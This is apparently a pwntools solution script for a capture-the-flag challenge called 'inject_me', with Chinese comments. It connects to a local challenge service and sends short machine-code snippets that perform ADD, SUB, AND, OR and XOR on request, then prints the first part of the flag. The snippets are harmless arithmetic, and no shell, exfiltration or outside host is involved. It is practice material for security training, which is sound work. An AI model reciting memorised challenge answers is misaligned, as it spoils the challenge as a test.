#!/usr/bin/env python3
from pwn import *

# 如果在本地调试，使用 process
# p = process('./inject_me')
# 如果是远程目标，使用 remote
# context.log_level = 'debug' # 开启debug日志，方便观察交互
REMOTE_PORT = 61425
REMOTE_IP = 'host.docker.internal'  # 根据实际情况设置目标IP地址
p = remote(REMOTE_IP, REMOTE_PORT)


# --- Part 1: Get the first flag ---

# Shellcodes for each operation

add_sc = b'\x8d\x04\x37\xc3'  
sub_sc = b'\x89\xf8\x29\xf0\xc3'  
and_sc = b'\x89\xf8\x21\xf0\xc3'
or_sc =  b'\x89\xf8\x09\xf0\xc3'
xor_sc = b'\x89\xf8\x31\xf0\xc3'
# Request-1: ADD
p.recvuntil(b'Request-1: give me code that performing ADD\n')
p.send(add_sc)

# Request-2: SUB
p.recvuntil(b'Request-2: give me code that performing SUB\n')
p.send(sub_sc)

# Request-3: AND
p.recvuntil(b'Request-3: give me code that performing AND\n')
p.send(and_sc)

# Request-4: OR
p.recvuntil(b'Request-4: give me code that performing OR\n')
p.send(or_sc)

# Request-5: XOR
p.recvuntil(b'Request-5: give me code that performing XOR\n')
p.send(xor_sc)

# Receive the first part of the flag
p.recvuntil(b'Soooooooo wonderful, here is your first part of flag:\n')
flag1 = p.recvline()
print(f"[*] Flag 1: {flag1.decode().strip()}")

# 关闭第一次连接
p.close()
